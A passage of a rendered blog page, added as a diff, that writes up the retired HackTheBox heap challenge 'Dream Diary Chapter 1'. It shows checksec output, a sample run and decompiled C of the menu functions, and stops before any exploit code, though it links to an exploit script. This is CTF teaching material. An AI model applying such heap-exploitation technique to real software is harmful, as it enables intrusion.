@@ -1,0 +1,1065 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HTB Pwn - Dream Diary Chapter: 1 &middot; Congo</title>
+    <meta name="title" content="HTB Pwn - Dream Diary Chapter: 1 &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn&rsquo;t get time for this writeup, so I will write it here.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/dream-diary-chapter-1/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/dream-diary-chapter-1/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="HTB Pwn - Dream Diary Chapter: 1">
+  <meta property="og:description" content="This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn’t get time for this writeup, so I will write it here.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2020-10-19T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-10-19T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HTB Pwn - Dream Diary Chapter: 1">
+<meta name="twitter:description" content="This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn&rsquo;t get time for this writeup, so I will write it here.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "HTB Pwn - Dream Diary Chapter: 1",
+    "headline": "HTB Pwn - Dream Diary Chapter: 1",
+    
+    "abstract": "This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn\u0026rsquo;t get time for this writeup, so I will write it here.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/dream-diary-chapter-1\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2020",
+    "dateCreated": "2020-10-19T00:00:00\u002b00:00",
+    "datePublished": "2020-10-19T00:00:00\u002b00:00",
+    
+    "dateModified": "2020-10-19T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "4566"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Pwn - Dream Diary Chapter: 1
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2020-10-19 00:00:00 &#43;0000 UTC">19 October 2020</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">22 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to do it earlier but couldn&rsquo;t get time for this writeup, so I will write it here.</p>
+<!-- more -->
+<h1 id="attachment" class="relative group">Attachment <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#attachment" aria-label="Anchor">#</a></span></h1><p>Binary: <a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1" target="_blank" rel="noreferrer">Get Here</a>
+Exploit: <a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/Unsafe%20Unlink/chapter1.py" target="_blank" rel="noreferrer">Get Here</a></p>
+<h1 id="initial-analysis" class="relative group">Initial Analysis <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-analysis" aria-label="Anchor">#</a></span></h1><p>First of, all we will see the binary and the security mechanisms on the binary and see the workflow of it. Let&rsquo;s identify the file:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[05:10:38]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">file</span> <span class="no">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="nl">chapter1:</span> <span class="nf">ELF</span> <span class="mi">64</span><span class="p">-</span><span class="no">bit</span> <span class="no">LSB</span> <span class="no">executable</span><span class="p">,</span> <span class="no">x86-64</span><span class="p">,</span> <span class="no">version</span> <span class="mi">1</span> <span class="p">(</span><span class="no">SYSV</span><span class="p">),</span> <span class="no">dynamically</span> <span class="no">linked</span><span class="p">,</span> <span class="no">interpreter</span> <span class="err">/</span><span class="no">lib64</span><span class="err">/</span><span class="no">ld-linux-x86-64.so.2</span><span class="p">,</span> <span class="no">for</span> <span class="no">GNU</span><span class="err">/</span><span class="no">Linux</span> <span class="mi">2</span><span class="no">.6.32</span><span class="p">,</span> <span class="no">BuildID</span><span class="p">[</span><span class="no">sha1</span><span class="p">]</span><span class="err">=</span><span class="mi">5</span><span class="no">fd205b7bbec91799613399634a187d1ca71e1a3</span><span class="p">,</span> <span class="no">stripped</span>
+</span></span></code></pre></div><p>So, this is a 64 bit binary and on top of that it is stripped, which means reverse engineering it&rsquo;ll take quite sometime, let&rsquo;s check the security mechanisms:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[05:10:41]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">checksec</span> <span class="no">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
+</span></span></code></pre></div><p><code>Canary</code> and <code>NX Enabled</code> means that overflow is not gonna happen easily considering <strong>iff</strong> any kind of overflow exists, and it has <code>Partial RELRO</code> which <code>Global Offset Table</code> would be in <code>r/w</code> section which means we can overwrite the GOT entries.</p>
+<p>All things, aside let&rsquo;s run the binary:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">2</span> <span class="err">[05:12:09]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="p">.</span><span class="err">/</span><span class="no">chapter1</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">+</span><span class="p">------------------------------</span><span class="err">+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="err">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">Size:</span> <span class="err">100</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Data:</span> <span class="nf">AAA</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Success</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="err">2</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Index:</span> <span class="err">0</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Data:</span> <span class="nf">AKSSKSK</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Done</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="nf">Invalid</span> <span class="no">choice</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="err">3</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Index:</span> <span class="err">0</span>
+</span></span></code></pre></div><p>So, it seems like it allocates a specific amount of size in memory and then let us store the data at allocated region. On top of that it allow us to delete the allocated region and even edit an allocated chunk. Since we want to pwn it, we need to reverse engineer it, let&rsquo;s go.</p>
+<h1 id="reverse-engineering" class="relative group">Reverse Engineering <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering" aria-label="Anchor">#</a></span></h1><p>First off, we will load the binary in IDA and let it do the work, then we will analyze the functions. First, we will check the <code>main</code> function:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">real_canary</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">real_canary</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">print_menu</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">edit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">delete</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LABEL_13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid choice!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">allocate</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Quite simple, it calls <code>print_menu</code> and then read the integer and depending on what option we choose, it calls the function, the only function which stands out for the interest here is <code>allocate</code>, <code>edit</code> and <code>delete</code> as this is the core functions of the binary, let&rsquo;s check those out.</p>
+<blockquote>
+<p>NOTE: I have named the functions to more readable names, so it&rsquo;ll help in understanding rest of the code.</p>
+</blockquote>
+<p>Let&rsquo;s check the <code>allocate</code>:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">allocate</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">real_canary</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">real_canary</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">nptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">15</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Too many notes!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">canary</span> <span class="o">^</span> <span class="n">real_canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Size: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read_string</span><span class="p">(</span><span class="n">nptr</span><span class="p">,</span> <span class="mi">6uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">size</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Malloc error!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">,</span> <span class="mi">6LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read_string</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Success!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">canary</span> <span class="o">^</span> <span class="n">real_canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>So, first of it checks if the total number of allocated notes is not more than 15, if it is not then it reads the size and then it allocates a chunk of <code>size</code> given, with the index of the note stored in the gloabl variable named <code>ptr</code>. For example, if none of the note has been allocated and given size is <code>0x40</code>, the <code>allocate </code>function will do <code>malloc(0x40)</code> then it address of the allocated chunk will be stored at <code>ptr[0] = &amp;allocated_chunk</code>.</p>
+<p>Now, it doesn&rsquo;t do much stuff which seems to be of interest, so let&rsquo;s move on the <code>delete</code> function:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">real_canary</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">real_canary</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
